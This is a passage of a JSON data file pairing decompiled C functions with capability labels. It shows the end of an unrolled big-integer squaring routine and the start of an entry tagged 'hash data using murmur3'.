*(puVar1 + 6) + uVar6;\n    if (uVar3 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 2) * *(puVar1 + 1) + uVar3 * 0x10000;\n    uVar6 = iVar7 + (uVar3 >> 0x10);\n    if (uVar8 < uVar3 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_8h = var_8h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar2 = uVar2 + uVar8 * 2;\n    if ((uVar2 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    uVar3 = var_4h + uVar5 + uVar6;\n    if (uVar3 < uVar6) {\n        var_8h = var_8h + 1;\n    }\n    arg_8h[3] = uVar2;\n    uVar2 = puVar1[2] & 0xffff;\n    uVar6 = puVar1[2] >> 0x10;\n    uVar8 = uVar2 * uVar6 * 0x20000;\n    uVar5 = uVar2 * uVar2 + uVar8;\n    uVar2 = uVar6 * uVar6 + (uVar2 * uVar6 >> 0xf);\n    if (uVar5 < uVar8) {\n        uVar2 = uVar2 + 1;\n    }\n    uVar3 = uVar3 + uVar5;\n    if (uVar3 < uVar5) {\n        uVar2 = uVar2 + 1;\n    }\n    arg_ch = var_8h + uVar2 < uVar2;\n    iVar7 = *(puVar1 + 0xe) * *(puVar1 + 6);\n    uVar6 = *(puVar1 + 0xe) * *(puVar1 + 1);\n    uVar5 = *(puVar1 + 3) * *(puVar1 + 6) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 3) * *(puVar1 + 1) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar2 = var_8h + uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        arg_ch = arg_ch + 1;\n    }\n    iVar7 = *(puVar1 + 0x12) * *(puVar1 + 2);\n    uVar6 = *(puVar1 + 0x12) * *puVar1;\n    uVar5 = *(puVar1 + 4) * *(puVar1 + 2) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 4) * *puVar1 + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar2 = uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[4] = uVar3;\n    iVar7 = *(puVar1 + 0x16) * *(puVar1 + 2);\n    uVar5 = *(puVar1 + 0x16) * *puVar1;\n    uVar3 = *(puVar1 + 5) * *(puVar1 + 2) + uVar5;\n    if (uVar3 < uVar5) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar6 = *(puVar1 + 5) * *puVar1 + uVar3 * 0x10000;\n    uVar5 = iVar7 + (uVar3 >> 0x10);\n    if (uVar6 < uVar3 * 0x10000) {\n        uVar5 = uVar5 + 1;\n    }\n    var_4h = (uVar5 & 0x80000000) != 0;\n    uVar5 = uVar5 * 2;\n    if ((uVar6 & 0x80000000) != 0) {\n        uVar5 = uVar5 + 1;\n    }\n    uVar2 = uVar2 + uVar6 * 2;\n    if ((uVar2 < uVar6 * 2) && (uVar5 = uVar5 + 1,  uVar5 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    if (arg_ch + uVar5 < uVar5) {\n        var_4h = var_4h + 1;\n    }\n    iVar7 = *(puVar1 + 0x12) * *(puVar1 + 6);\n    uVar6 = *(puVar1 + 0x12) * *(puVar1 + 1);\n    uVar3 = *(puVar1 + 4) * *(puVar1 + 6) + uVar6;\n    if (uVar3 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 4) * *(puVar1 + 1) + uVar3 * 0x10000;\n    uVar6 = iVar7 + (uVar3 >> 0x10);\n    if (uVar8 < uVar3 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_4h = var_4h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar2 = uVar2 + uVar8 * 2;\n    if ((uVar2 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    uVar3 = arg_ch + uVar5 + uVar6;\n    if (uVar3 < uVar6) {\n        var_4h = var_4h + 1;\n    }\n    iVar7 = *(puVar1 + 0xe) * *(puVar1 + 10);\n    uVar6 = *(puVar1 + 0xe) * *(puVar1 + 2);\n    uVar5 = *(puVar1 + 3) * *(puVar1 + 10) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 3) * *(puVar1 + 2) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_4h = var_4h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar2 = uVar2 + uVar8 * 2;\n    if ((uVar2 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    uVar3 = uVar3 + uVar6;\n    if (uVar3 < uVar6) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[5] = uVar2;\n    uVar2 = puVar1[3] & 0xffff;\n    uVar6 = puVar1[3] >> 0x10;\n    uVar8 = uVar2 * uVar6 * 0x20000;\n    uVar5 = uVar2 * uVar2 + uVar8;\n    uVar2 = uVar6 * uVar6 + (uVar2 * uVar6 >> 0xf);\n    if (uVar5 < uVar8) {\n        uVar2 = uVar2 + 1;\n    }\n    uVar3 = uVar3 + uVar5;\n    if (uVar3 < uVar5) {\n        uVar2 = uVar2 + 1;\n    }\n    var_8h = var_4h + uVar2 < uVar2;\n    iVar7 = *(puVar1 + 0x12) * *(puVar1 + 10);\n    uVar6 = *(puVar1 + 0x12) * *(puVar1 + 2);\n    uVar5 = *(puVar1 + 4) * *(puVar1 + 10) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 4) * *(puVar1 + 2) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_8h = var_8h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    uVar2 = var_4h + uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        var_8h = var_8h + 1;\n    }\n    iVar7 = *(puVar1 + 0x16) * *(puVar1 + 6);\n    uVar6 = *(puVar1 + 0x16) * *(puVar1 + 1);\n    uVar5 = *(puVar1 + 5) * *(puVar1 + 6) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 5) * *(puVar1 + 1) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_8h = var_8h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    uVar2 = uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        var_8h = var_8h + 1;\n    }\n    iVar7 = *(puVar1 + 0x1a) * *(puVar1 + 2);\n    uVar6 = *(puVar1 + 0x1a) * *puVar1;\n    uVar5 = *(puVar1 + 6) * *(puVar1 + 2) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 6) * *puVar1 + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_8h = var_8h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    uVar2 = uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        var_8h = var_8h + 1;\n    }\n    arg_8h[6] = uVar3;\n    iVar7 = *(puVar1 + 0x1e) * *(puVar1 + 2);\n    uVar5 = *(puVar1 + 0x1e) * *puVar1;\n    uVar3 = *(puVar1 + 7) * *(puVar1 + 2) + uVar5;\n    if (uVar3 < uVar5) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar6 = *(puVar1 + 7) * *puVar1 + uVar3 * 0x10000;\n    uVar5 = iVar7 + (uVar3 >> 0x10);\n    if (uVar6 < uVar3 * 0x10000) {\n        uVar5 = uVar5 + 1;\n    }\n    arg_ch = (uVar5 & 0x80000000) != 0;\n    uVar5 = uVar5 * 2;\n    if ((uVar6 & 0x80000000) != 0) {\n        uVar5 = uVar5 + 1;\n    }\n    uVar2 = uVar2 + uVar6 * 2;\n    if ((uVar2 < uVar6 * 2) && (uVar5 = uVar5 + 1,  uVar5 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    if (var_8h + uVar5 < uVar5) {\n        arg_ch = arg_ch + 1;\n    }\n    iVar7 = *(puVar1 + 0x1a) * *(puVar1 + 6);\n    uVar6 = *(puVar1 + 0x1a) * *(puVar1 + 1);\n    uVar3 = *(puVar1 + 6) * *(puVar1 + 6) + uVar6;\n    if (uVar3 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 6) * *(puVar1 + 1) + uVar3 * 0x10000;\n    uVar6 = iVar7 + (uVar3 >> 0x10);\n    if (uVar8 < uVar3 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar2 = uVar2 + uVar8 * 2;\n    if ((uVar2 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar3 = var_8h + uVar5 + uVar6;\n    if (uVar3 < uVar6) {\n        arg_ch = arg_ch + 1;\n    }\n    iVar7 = *(puVar1 + 0x16) * *(puVar1 + 10);\n    uVar6 = *(puVar1 + 0x16) * *(puVar1 + 2);\n    uVar5 = *(puVar1 + 5) * *(puVar1 + 10) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 5) * *(puVar1 + 2) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar2 = uVar2 + uVar8 * 2;\n    if ((uVar2 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar3 = uVar3 + uVar6;\n    if (uVar3 < uVar6) {\n        arg_ch = arg_ch + 1;\n    }\n    iVar7 = *(puVar1 + 0x12) * *(puVar1 + 0xe);\n    uVar6 = *(puVar1 + 0x12) * *(puVar1 + 3);\n    uVar5 = *(puVar1 + 4) * *(puVar1 + 0xe) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 4) * *(puVar1 + 3) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar2 = uVar2 + uVar8 * 2;\n    if ((uVar2 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar3 = uVar3 + uVar6;\n    if (uVar3 < uVar6) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[7] = uVar2;\n    uVar2 = puVar1[4] & 0xffff;\n    uVar6 = puVar1[4] >> 0x10;\n    uVar8 = uVar2 * uVar6 * 0x20000;\n    uVar5 = uVar2 * uVar2 + uVar8;\n    uVar2 = uVar6 * uVar6 + (uVar2 * uVar6 >> 0xf);\n    if (uVar5 < uVar8) {\n        uVar2 = uVar2 + 1;\n    }\n    uVar3 = uVar3 + uVar5;\n    if (uVar3 < uVar5) {\n        uVar2 = uVar2 + 1;\n    }\n    var_4h = arg_ch + uVar2 < uVar2;\n    iVar7 = *(puVar1 + 0x16) * *(puVar1 + 0xe);\n    uVar6 = *(puVar1 + 0x16) * *(puVar1 + 3);\n    uVar5 = *(puVar1 + 5) * *(puVar1 + 0xe) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 5) * *(puVar1 + 3) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_4h = var_4h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    uVar2 = arg_ch + uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        var_4h = var_4h + 1;\n    }\n    iVar7 = *(puVar1 + 0x1a) * *(puVar1 + 10);\n    uVar6 = *(puVar1 + 0x1a) * *(puVar1 + 2);\n    uVar5 = *(puVar1 + 6) * *(puVar1 + 10) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 6) * *(puVar1 + 2) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_4h = var_4h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    uVar2 = uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        var_4h = var_4h + 1;\n    }\n    iVar7 = *(puVar1 + 0x1e) * *(puVar1 + 6);\n    uVar6 = *(puVar1 + 0x1e) * *(puVar1 + 1);\n    uVar5 = *(puVar1 + 7) * *(puVar1 + 6) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 7) * *(puVar1 + 1) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_4h = var_4h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    uVar2 = uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[8] = uVar3;\n    iVar7 = *(puVar1 + 0x1e) * *(puVar1 + 10);\n    uVar5 = *(puVar1 + 0x1e) * *(puVar1 + 2);\n    uVar3 = *(puVar1 + 7) * *(puVar1 + 10) + uVar5;\n    if (uVar3 < uVar5) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar6 = *(puVar1 + 7) * *(puVar1 + 2) + uVar3 * 0x10000;\n    uVar5 = iVar7 + (uVar3 >> 0x10);\n    if (uVar6 < uVar3 * 0x10000) {\n        uVar5 = uVar5 + 1;\n    }\n    var_8h = (uVar5 & 0x80000000) != 0;\n    uVar5 = uVar5 * 2;\n    if ((uVar6 & 0x80000000) != 0) {\n        uVar5 = uVar5 + 1;\n    }\n    uVar2 = uVar2 + uVar6 * 2;\n    if ((uVar2 < uVar6 * 2) && (uVar5 = uVar5 + 1,  uVar5 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    if (var_4h + uVar5 < uVar5) {\n        var_8h = var_8h + 1;\n    }\n    iVar7 = *(puVar1 + 0x1a) * *(puVar1 + 0xe);\n    uVar6 = *(puVar1 + 0x1a) * *(puVar1 + 3);\n    uVar3 = *(puVar1 + 6) * *(puVar1 + 0xe) + uVar6;\n    if (uVar3 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 6) * *(puVar1 + 3) + uVar3 * 0x10000;\n    uVar6 = iVar7 + (uVar3 >> 0x10);\n    if (uVar8 < uVar3 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_8h = var_8h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar2 = uVar2 + uVar8 * 2;\n    if ((uVar2 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    uVar3 = var_4h + uVar5 + uVar6;\n    if (uVar3 < uVar6) {\n        var_8h = var_8h + 1;\n    }\n    iVar7 = *(puVar1 + 0x16) * *(puVar1 + 0x12);\n    uVar6 = *(puVar1 + 0x16) * *(puVar1 + 4);\n    uVar5 = *(puVar1 + 5) * *(puVar1 + 0x12) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 5) * *(puVar1 + 4) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_8h = var_8h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar2 = uVar2 + uVar8 * 2;\n    if ((uVar2 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    uVar3 = uVar3 + uVar6;\n    if (uVar3 < uVar6) {\n        var_8h = var_8h + 1;\n    }\n    arg_8h[9] = uVar2;\n    uVar2 = puVar1[5] & 0xffff;\n    uVar6 = puVar1[5] >> 0x10;\n    uVar8 = uVar2 * uVar6 * 0x20000;\n    uVar5 = uVar2 * uVar2 + uVar8;\n    uVar2 = uVar6 * uVar6 + (uVar2 * uVar6 >> 0xf);\n    if (uVar5 < uVar8) {\n        uVar2 = uVar2 + 1;\n    }\n    uVar3 = uVar3 + uVar5;\n    if (uVar3 < uVar5) {\n        uVar2 = uVar2 + 1;\n    }\n    arg_ch = var_8h + uVar2 < uVar2;\n    iVar7 = *(puVar1 + 0x1a) * *(puVar1 + 0x12);\n    uVar6 = *(puVar1 + 0x1a) * *(puVar1 + 4);\n    uVar5 = *(puVar1 + 6) * *(puVar1 + 0x12) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 6) * *(puVar1 + 4) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar2 = var_8h + uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        arg_ch = arg_ch + 1;\n    }\n    iVar7 = *(puVar1 + 0x1e) * *(puVar1 + 0xe);\n    uVar6 = *(puVar1 + 0x1e) * *(puVar1 + 3);\n    uVar5 = *(puVar1 + 7) * *(puVar1 + 0xe) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 7) * *(puVar1 + 3) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar2 = uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[10] = uVar3;\n    iVar7 = *(puVar1 + 0x1e) * *(puVar1 + 0x12);\n    uVar5 = *(puVar1 + 0x1e) * *(puVar1 + 4);\n    uVar3 = *(puVar1 + 7) * *(puVar1 + 0x12) + uVar5;\n    if (uVar3 < uVar5) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar6 = *(puVar1 + 7) * *(puVar1 + 4) + uVar3 * 0x10000;\n    uVar5 = iVar7 + (uVar3 >> 0x10);\n    if (uVar6 < uVar3 * 0x10000) {\n        uVar5 = uVar5 + 1;\n    }\n    var_4h = (uVar5 & 0x80000000) != 0;\n    uVar5 = uVar5 * 2;\n    if ((uVar6 & 0x80000000) != 0) {\n        uVar5 = uVar5 + 1;\n    }\n    uVar2 = uVar2 + uVar6 * 2;\n    if ((uVar2 < uVar6 * 2) && (uVar5 = uVar5 + 1,  uVar5 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    if (arg_ch + uVar5 < uVar5) {\n        var_4h = var_4h + 1;\n    }\n    iVar7 = *(puVar1 + 0x1a) * *(puVar1 + 0x16);\n    uVar6 = *(puVar1 + 0x1a) * *(puVar1 + 5);\n    uVar3 = *(puVar1 + 6) * *(puVar1 + 0x16) + uVar6;\n    if (uVar3 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 6) * *(puVar1 + 5) + uVar3 * 0x10000;\n    uVar6 = iVar7 + (uVar3 >> 0x10);\n    if (uVar8 < uVar3 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_4h = var_4h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar2 = uVar2 + uVar8 * 2;\n    if ((uVar2 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    uVar3 = arg_ch + uVar5 + uVar6;\n    if (uVar3 < uVar6) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[0xb] = uVar2;\n    uVar2 = puVar1[6] & 0xffff;\n    uVar6 = puVar1[6] >> 0x10;\n    uVar8 = uVar2 * uVar6 * 0x20000;\n    uVar5 = uVar2 * uVar2 + uVar8;\n    uVar2 = uVar6 * uVar6 + (uVar2 * uVar6 >> 0xf);\n    if (uVar5 < uVar8) {\n        uVar2 = uVar2 + 1;\n    }\n    uVar3 = uVar3 + uVar5;\n    if (uVar3 < uVar5) {\n        uVar2 = uVar2 + 1;\n    }\n    var_8h = var_4h + uVar2 < uVar2;\n    iVar7 = *(puVar1 + 0x1e) * *(puVar1 + 0x16);\n    uVar6 = *(puVar1 + 0x1e) * *(puVar1 + 5);\n    uVar5 = *(puVar1 + 7) * *(puVar1 + 0x16) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 7) * *(puVar1 + 5) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_8h = var_8h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    uVar2 = var_4h + uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        var_8h = var_8h + 1;\n    }\n    arg_8h[0xc] = uVar3;\n    iVar7 = *(puVar1 + 0x1e) * *(puVar1 + 0x1a);\n    uVar5 = *(puVar1 + 0x1e) * *(puVar1 + 6);\n    uVar3 = *(puVar1 + 7) * *(puVar1 + 0x1a) + uVar5;\n    if (uVar3 < uVar5) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar6 = *(puVar1 + 7) * *(puVar1 + 6) + uVar3 * 0x10000;\n    uVar5 = iVar7 + (uVar3 >> 0x10);\n    if (uVar6 < uVar3 * 0x10000) {\n        uVar5 = uVar5 + 1;\n    }\n    uVar3 = (uVar5 & 0x80000000) != 0;\n    uVar5 = uVar5 * 2;\n    if ((uVar6 & 0x80000000) != 0) {\n        uVar5 = uVar5 + 1;\n    }\n    uVar2 = uVar2 + uVar6 * 2;\n    if ((uVar2 < uVar6 * 2) && (uVar5 = uVar5 + 1,  uVar5 == 0)) {\n        uVar3 = uVar3 + 1;\n    }\n    if (var_8h + uVar5 < uVar5) {\n        uVar3 = uVar3 + 1;\n    }\n    arg_8h[0xd] = uVar2;\n    uVar2 = puVar1[7] & 0xffff;\n    uVar6 = puVar1[7] >> 0x10;\n    uVar8 = uVar2 * uVar6 * 0x20000;\n    iVar7 = uVar6 * uVar6 + (uVar2 * uVar6 >> 0xf);\n    uVar2 = uVar2 * uVar2 + uVar8;\n    if (uVar2 < uVar8) {\n        iVar7 = iVar7 + 1;\n    }\n    uVar5 = var_8h + uVar5 + uVar2;\n    if (uVar5 < uVar2) {\n        iVar7 = iVar7 + 1;\n    }\n    arg_8h[0xe] = uVar5;\n    arg_8h[0xf] = iVar7 + uVar3;\n    return;\n}\n",
        "token_count": 11859
    },
    "2002ab8f": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
